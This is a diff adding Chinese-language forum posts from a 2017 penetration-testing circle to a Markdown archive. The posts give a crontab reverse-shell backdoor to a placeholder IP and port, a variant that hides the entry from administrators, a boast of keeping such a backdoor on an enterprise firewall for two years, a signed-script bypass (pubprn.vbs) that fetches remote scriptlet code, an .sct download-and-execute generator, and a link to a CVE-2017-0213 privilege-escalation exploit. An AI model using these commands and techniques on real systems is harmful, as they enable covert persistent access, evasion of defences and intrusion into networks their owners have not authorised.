@@ -3,6 +3,10 @@
 - [webshell扫描](#webshell扫描)
 - [域渗透](#域渗透)
 - [MSF](#msf)
+- [Bash](#bash)
+- [powershell](#powershell)
+- [Downloader](#downloader)
+- [Windows COM](#windows-com)
 - [Exchange](#exchange)
 - [边界设备安全](#边界设备安全)
 
@@ -80,6 +84,314 @@ BTW：今天转的 FreeBuf 另一篇文章作者据说只是个高中生。
 ...
 
 ---
+
+## Bash
+
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-06-22:
+
+
+__#姿势#__
+
+  一条命令实现无文件兼容性强的反弹后门,收集自强大的前乌云。
+我觉得很实用且强大,分享给大家.
+
+```
+(crontab -l;echo '*/60 * * * * exec 9<> /dev/tcp/IP/port;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')|crontab -
+```
+
+就是一条SHELL脚本，通过crontab 自定义一条定时执行的任务。
+
+
+<详解>
+
+`/dev/tcp/IP/port`  ：通过调用/dev/tcp 类似发出了一个socket的调用，建立一个socket连接，读写这个/dev/tcp就相当于在这个socket连接中传输数据，后面跟上你控制端的IP和端口，当然也可以写上你的域名，这样你植入后门后，你接收SHELL的服务器IP发生改变，你同样能收到SHELL。
+
+`exec 9<>`  ：9是linux 中的文件描述符，0代表从键盘输入，1代表标准输出的，2代表错误输出的，这个大家都知道吧，其实一共有10个，只是其它的默认没有打开。exec 9<> ，意思是以读写方式打开/dev/tcp，然后所有的数据都会保留在9这个文件描述符内，并通过tcp连接在两端传输。
+
+`exec 0<&9`  :意思是将9里面的内容传送给输入端，作用是当我们在控制端输入命令的时候，命令就自动传到被控端并被输入执行.
+
+`exec 1>9&`  : 这个意思大家现在能明白了吧，就是被控端执行命令后的正确回显也输出到 9，这样我们在控制端就能接收到。
+
+`2>&1`   :错误的输出也指向1，而前面1已经指向到了9，所以错误的消息也传向了9，这样我们就能在控制端收到正确和错误的回显了。
+
+`/bin/bash --noprofile -i`  :这个就是调用bash来执行我们输入的命令，后面跟的参数是禁止执行一些登录shell时调用的脚本。
+
+
+前面的时间设定很简单，大家不明白的可以百度下，我曾经植入一条这样的后门到一个大型企业的网关防火墙上（linux内核），每个月只连出来一次，2年了人家都没发现，当然可能管理员比较懒。拿到网关shell当然各种代理就都不是事了。
+
+当然管理员通过crontab -l 可以查看到任务，
+
+不过你这样：
+
+```
+(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/IP/PORT;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -  
+```
+
+猥琐版直接显示你用户名下没有任务....
+
+在未连接状态启动反连任务的时候，进程和端口都无状态。
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: ****是什么
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 要不百度下crontab的用法？ 是设置时间用的，依次排序下去就是设置 分 时 日 月 周 ，*如果在日这个单位上，就是不限制在每月哪号。
+
+<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 了解了
+
+<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 6666   定时反弹shell这是，同时问下 linux想转发另外一台的3389出来，有什么好办法，用iptable做nat转发失败
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 参考下之前弦哥发的，ssh端口转发实战，应该可以解决你的问题。
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补充下：这个指令来自猪猪侠
+
+<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 下午在centos和kali上测试都显示9是Bad file descriptor
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 你没开监听就会这样，试着先开监听
+
+<img src="https://file.xiaomiquan.com/3a/1d/3a1dfafee22fabee58800a8d92e40cb97cae002fa0245156de52e427a2631344.jpg" width="25px"/> __Leo__: kali里面直接在命令行里可以反弹拿到shell，但是在crontab里面无法拿shell，求解
+
+
+...
+
+---
+
+
+## powershell
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-19:
+
+
+__#姿势#__
+
+ Increased use of PowerShell in attacks
+
+推荐这篇来自赛门铁克的 Paper，这是一篇难得攻防介绍很全面的研究成果，从 PowerShell 基础到各攻击阶段的姿势：
+
+执行策略
+
+植入
+- 如：Email、Office 宏、Exploit Kits、横向渗透、策略文件、任务计划、PsExec、等
+
+持久化
+- 如：注册表、WMI、任务计划、启动目录、组策略、策略文件、等
+
+混淆
+- 如：大小写、空格、Get-自动补全、System.自动补全、引号拼接、反单引魔法、通配符魔法、别名、向后兼容、进制转换、-f格式化、XOR、BrainFuck、等
+
+一些绕过技巧
+
+在列举这些攻击过程的同时还举例了一些经典木马的案例，最后还好些篇幅介绍了防御姿势。
+
+这篇 Paper 是去年的，如果能通读下来并做些实践，会很受益。
+
+昨天我带团队通读了一遍，对于团队来说两块很明显的收益：英文能力提升、PowerShell 攻防姿势提升。
+
+PowerShell 已经成为玩渗透必备技能，如果你还没掌握，赶快入坑。😏
+
+
+__分享文件:__
+[increased-use-of-powershell-in-attacks-16-en.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)
+
+
+...
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 去年开始，(null)   就一直喊我学 PowerShell，只要和我见面必然会 Show 他的成果，还给我分享了各种环境、工具及学习笔记。可我当时并不以为然啊，Python 与 JavaScript 是我最好的武器，在我的工作场景下基本通杀全栈，我觉得够了，没想到，PowerShell 已经吐火如茶成这样，果然是老司机的建议，咱都收...
+
+<img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 吐火如茶？如火如荼？
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__: 哈，手快敲错
+
+<img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__: 自带混淆这个不错。
+
+<img src="https://file.xiaomiquan.com/b2/27/b2273c727cd42d41352bd2bb195a82e4d41270073f0e99e7e46ffb1a1566c21f.jpg" width="25px"/> __。__: 各大杀软已经把恶意调用powershell加入黑名单了…真的厉害😂过段时间应该会有人在xx大会上分享powershell了
+
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ on 2017-06-24:
+
+.sct generator by Moriarty@DMZLab
+这是我闲着蛋疼用powershell 写的一个GUI小程序，功能主要是用来生成.sct文件。发这DD的目的主要是给大家介绍一下另一种方式来写GUI程序———Form（窗体）。用这种方式可以仅仅只需要powershell studio一个IDE就可以完成，在写一些简单的GUI的程序尤其适合。
+那么程序本身的功能很简单，就是用来生成.sct文件，这个类型的文件想必好多朋友都已经了解，subtee牛已经详细阐述过了。我一般用它下载执行exe文件的时候居多，用法如下：
+1.用certutil.exe(win7以上系统自带）将exe转成shellcode，格式如下：
+certutil.exe -encode setup.exe setup.b64
+2.将setup.b64的内容复制黏贴到中间输入框中，然后点击Generate即可生成一个随机命名的.sct文件。
+3.将这个文件放到一个web server上，然后用程序中给出的一句话在目标机器上执行，即可完成exe的下载并执行。
+程序中的refresh可以重新初始化所有参数（主要是重新生成一些随机的命名），clear会清空中间输入框中的内容。
+如果你想生成其它功能的.sct文件，可以双击第一个文本框和第三个文本框使之变为可修改状态，就可以定制自己的sct文件了。
+工具虽小，但我里面用了一些小技巧，你在阅读源码的时候应该就会注意到了。另外，写得仓促，可能有错误或者需要改进的地方，圈友们可自行修改。
+
+<img src="https://images.xiaomiquan.com/Fvb1uk0UNtTW4QO5ztFWnIhekvWg?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:WCbccaAneV-SSm2aQD_ttO-v1IM=" width="50%" height="50%" align="middle"/>
+<img src="https://images.xiaomiquan.com/Fkr-fsE9IHqeL1mLm1clvDYlA_uF?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:BmcsH54WipZgXlwsaGngF9B6qh0=" width="50%" height="50%" align="middle"/>
+
+__分享文件:__
+[SctGenerator.zip](https://github.com/ChrisLinn/sst-2017/blob/master/shared-files/SctGenerator.zip)
+
+
+...
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: PowerShell 系列😏
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 这个我喜欢
+
+
+...
+
+---
+
+## downloader
+
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:
+
+
+__#姿势#__
+
+给大家分享点具体渗透姿势，比如白名单下载恶意代码的一个技巧。
+
+OPCDE 里看到的一个技巧：
+
+```
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs blah "script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
+```
+
+
+```
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs blah "script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
+```
+
+
+
+简单说下：
+
+第一个是英文的 Win10，第二个是中文的 Win10。test.sct 里的代码会弹个计算器。pubprn.vbs 是 Win 系统自带的，被签名过的。通过这种方式，可以 bypass 一些防御。pubprn.vbs 充当 downloader 角色。
+
+中文，我自己实测的，据其他圈友测试 Win7/XP 都 OK。
+
+test.sct代码如下：
+
+```
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Bandit"
+    progid="Bandit"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    remotable="true"
+ >
+</registration>
+
+<script language="JScript">
+<![CDATA[
+
+  var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+ 
+ 
+]]>
+</script>
+
+</scriptlet>
+```
+
+
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:
+
+
+__#姿势#__
+
+  接上面那条 SCT 的白名单下载技巧，推上发现 @subTee  又扔出一个小技巧：
+
+Hope your SCT detection is richer than looking for 
+`<scriptlet><registration>`
+Cause `<package><component>` works too 😀
+
+代码在这：
+
+[https://gist.github.com/subTee/7cec8af1ae9b9493731...](https://gist.github.com/subTee/7cec8af1ae9b9493731b8ec70e2cf034)
+
+
+
+拷贝过来如下：
+
+```
+<?xml version="1.0"?>
+<package>
+  <comment>
+    
+  </comment>
+
+  <component id="ABAPTest">
+    <?component error="true" debug="true"?>
+
+    <registration 
+    progid="PoC"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+
+    <script >
+        <![CDATA[
+
+            var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
+
+        ]]>
+    </script>
+</registration>
+
+  </component>
+</package>
+```
+
+也真只有吃透 Win，才能 hack 出更多独特玩法啊。
+
+
+---
+
+
+## Windows COM
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:
+
+
+__#姿势#__
+
+  CVE-2017-0213 Windows COM 特权提升漏洞组件，实战测试 WIN10 1703 完美通过，下载地址：
+
+
+[Exploits/CVE-2017-0213 at master · WindowsExploits...](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213)
+
+
+
+演示视频：
+
+
+[CVE-2017-0213-hackone的秒拍](http://m.miaopai.com/show/channel/dciBNvvRVHMhThOIlaqG9qogVpApkSJ3)
+
+
+
+来自本圈@h4ck0ne  的实测及演示视频录制，提权神洞，推荐给大家。
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 如果目标是域内的一台server，通过这个在本地把域账号添加到管理员组也适用么？
+
+<img src="https://file.xiaomiquan.com/74/dd/74dd868df857e0ffec8613ae99f0891f0e7088f3533e8bd16f9614477984d3f6.jpg" width="25px"/> __‍迷途の狼__ replies to <img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 不行
+
+
+...
+
+---
+
 
 ## Exchange
 
